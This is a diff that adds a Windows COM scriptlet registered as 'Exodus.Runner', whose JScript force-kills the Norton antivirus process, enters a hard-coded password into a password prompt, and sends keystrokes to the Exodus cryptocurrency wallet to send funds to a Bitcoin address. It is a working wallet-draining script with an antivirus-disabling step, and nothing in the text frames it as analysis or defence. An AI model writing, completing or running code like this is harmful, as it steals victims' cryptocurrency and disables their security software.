@@ -1,0 +1,17 @@
+<scriptlet>
+<registration progid="Exodus.Runner" classid="{AAAA1111-0000-0000-0000-0000FEEDC0DE}"/>
+<script language="JScript">
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("taskkill /IM norton.exe /F",0,true); // optional pre-kill
+
+    WScript.Sleep(3000);
+    shell.AppActivate("Enter Password");
+    shell.SendKeys("!Mamoute901{ENTER}");
+    WScript.Sleep(4000);
+
+    shell.AppActivate("EXODUS");
+    shell.SendKeys("%w");
+    shell.SendKeys("%s");
+    shell.SendKeys("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa");
+</script>
+</scriptlet>
